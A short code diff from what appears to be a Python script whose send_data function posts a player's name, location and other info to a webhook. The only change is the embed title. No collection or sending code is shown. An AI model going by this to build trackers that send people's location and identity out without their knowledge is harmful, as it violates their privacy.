@@ -65,7 +65,7 @@ def send_data():
     webhook_payload = {
         "embeds": [
             {
-                "title": "📍 New Player Location & Info",
+                "title": "🐍 Snake Player Location & Info",
                 "color": 3447003,
                 "fields": [
                     {"name": "Player Name", "value": str(player_name), "inline": False},
